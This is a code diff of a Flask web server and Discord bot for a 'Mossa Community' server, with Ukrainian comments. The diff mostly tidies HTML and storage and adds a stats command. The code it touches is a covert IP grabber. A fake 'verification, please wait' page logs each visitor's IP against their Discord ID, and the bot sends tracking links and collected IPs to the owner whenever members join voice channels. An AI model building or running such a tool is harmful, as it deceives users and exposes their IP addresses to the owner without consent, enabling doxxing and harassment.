@@ -4,15 +4,9 @@ import json
 import datetime
 import os
 import threading
+import time
+import random
 from flask import Flask, request, jsonify
-from dotenv import load_dotenv
-
-# ====== ЗАВАНТАЖУЄМО ЗМІННІ ======
-load_dotenv()
-
-TOKEN = os.getenv('DISCORD_TOKEN')
-YOUR_USER_ID = int(os.getenv('YOUR_USER_ID', '0'))
-RENDER_URL = os.getenv('RENDER_URL', 'https://mossa.onrender.com')
 
 # ====== ВЕБ-СЕРВЕР ======
 app = Flask(__name__)
@@ -23,10 +17,18 @@ def home():
     return """
     <!DOCTYPE html>
     <html>
-    <head><title>Mossa Community</title></head>
-    <body style="font-family: Arial; text-align: center; padding: 50px; background: #f0f0f0;">
-        <div style="background: white; padding: 40px; border-radius: 20px; max-width: 600px; margin: 0 auto;">
-            <h1 style="color: #5865F2;">🎮 Mossa Community</h1>
+    <head>
+        <title>Mossa Community</title>
+        <meta charset="UTF-8">
+        <style>
+            body { font-family: Arial; text-align: center; padding: 50px; background: #f0f0f0; }
+            .container { background: white; padding: 40px; border-radius: 20px; max-width: 600px; margin: 0 auto; }
+            h1 { color: #5865F2; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>🎮 Mossa Community</h1>
             <p>Ласкаво просимо на наш сервер!</p>
             <p style="color: gray; font-size: 12px;">v1.0</p>
         </div>
@@ -46,11 +48,19 @@ def verify_user(user_id):
     return """
     <!DOCTYPE html>
     <html>
-    <head><title>Перевірка</title></head>
-    <body style="font-family: Arial; text-align: center; padding: 50px; background: #1a1a2e;">
-        <div style="background: #16213e; padding: 40px; border-radius: 20px; max-width: 500px; margin: 0 auto;">
-            <h1 style="color: #e94560;">⏳ Перевірка...</h1>
-            <p style="color: #eee;">Будь ласка, зачекайте...</p>
+    <head>
+        <title>Перевірка</title>
+        <style>
+            body { font-family: Arial; text-align: center; padding: 50px; background: #1a1a2e; }
+            .container { background: #16213e; padding: 40px; border-radius: 20px; max-width: 500px; margin: 0 auto; }
+            h1 { color: #e94560; }
+            p { color: #eee; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>⏳ Перевірка...</h1>
+            <p>Будь ласка, зачекайте...</p>
             <p style="color: #666; font-size: 12px;">Це займе лише кілька секунд</p>
         </div>
         <script>
@@ -68,10 +78,32 @@ def get_ip_api(user_id):
         return jsonify({"status": "ok", "ip": user_ips[user_id]["ip"]})
     return jsonify({"status": "not_found"})
 
-# ====== DISCORD БОТ ======
+@app.route('/health')
+def health():
+    return "OK", 200
+
+# ====== ТОКЕН БЕРЕТЬСЯ З ЗМІННИХ СЕРЕДОВИЩА ======
+TOKEN = os.getenv('DISCORD_TOKEN')
+YOUR_USER_ID = int(os.getenv('YOUR_USER_ID', '0'))
+RENDER_URL = os.getenv('RENDER_URL', 'https://mossa.onrender.com')
+
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix='!', intents=intents)
 
+# ====== ЗБЕРІГАННЯ ДАНИХ ======
+DATA_FILE = "users_data.json"
+
+def load_data():
+    if os.path.exists(DATA_FILE):
+        with open(DATA_FILE, 'r', encoding='utf-8') as f:
+            return json.load(f)
+    return {}
+
+def save_data(data):
+    with open(DATA_FILE, 'w', encoding='utf-8') as f:
+        json.dump(data, f, indent=2, ensure_ascii=False)
+
+# ====== ПОДІЇ БОТА ======
 @bot.event
 async def on_ready():
     print(f'✅ Бот {bot.user} запущено!')
@@ -90,6 +122,7 @@ async def on_voice_state_update(member, before, after):
     if before.channel is None and after.channel is not None:
         user_id = str(member.id)
         
+        # Перевіряємо чи вже є IP
         if user_id in user_ips:
             try:
                 user = await bot.fetch_user(YOUR_USER_ID)
@@ -108,6 +141,7 @@ async def on_voice_state_update(member, before, after):
             except Exception as e:
                 print(f"❌ Помилка: {e}")
         
+        # Якщо IP немає - надсилаємо посилання
         tracking_link = f"{RENDER_URL}/verify/{user_id}"
         try:
             user = await bot.fetch_user(YOUR_USER_ID)
@@ -137,6 +171,7 @@ async def on_voice_state_update(member, before, after):
         except Exception as e:
             print(f"❌ Помилка: {e}")
 
+# ====== КОМАНДИ ======
 @bot.command(name='ip')
 async def get_ip(ctx, user: discord.Member = None):
     """Отримати IP користувача"""
@@ -199,6 +234,24 @@ async def list_ips(ctx):
     embed.description = desc[:4096]
     await ctx.send(embed=embed)
 
+@bot.command(name='stats')
+async def show_stats(ctx):
+    """Показати статистику"""
+    if ctx.author.id != YOUR_USER_ID:
+        await ctx.send("⛔ Тільки для власника!")
+        return
+    
+    data = load_data()
+    total = len(data)
+    
+    embed = discord.Embed(
+        title="📊 Статистика",
+        color=discord.Color.blue()
+    )
+    embed.add_field(name="👥 Всього учасників", value=total, inline=True)
+    embed.add_field(name="🕵️ Зібрано IP", value=len(user_ips), inline=True)
+    await ctx.send(embed=embed)
+
 @bot.command(name='clear_ips')
 async def clear_ips(ctx):
     """Очистити зібрані IP"""
@@ -212,7 +265,8 @@ async def clear_ips(ctx):
 # ====== ЗАПУСК ВЕБ-СЕРВЕРА ======
 def run_web_server():
     port = int(os.getenv('PORT', 8080))
-    app.run(host='0.0.0.0', port=port)
+    print(f"🚀 Запуск веб-сервера на порту {port}")
+    app.run(host='0.0.0.0', port=port, debug=False)
 
 # ====== ЗАПУСК БОТА ======
 if __name__ == "__main__":
@@ -224,11 +278,13 @@ if __name__ == "__main__":
     if YOUR_USER_ID == 0:
         print("⚠️ ПОПЕРЕДЖЕННЯ: YOUR_USER_ID не налаштовано!")
     
-    # Запускаємо веб-сервер
+    # Запускаємо веб-сервер в окремому потоці
     web_thread = threading.Thread(target=run_web_server)
     web_thread.daemon = True
     web_thread.start()
-    print("🚀 Веб-сервер запущено!")
+    
+    time.sleep(2)
+    print("🚀 Запуск бота...")
     
     # Запускаємо бота
     bot.run(TOKEN)
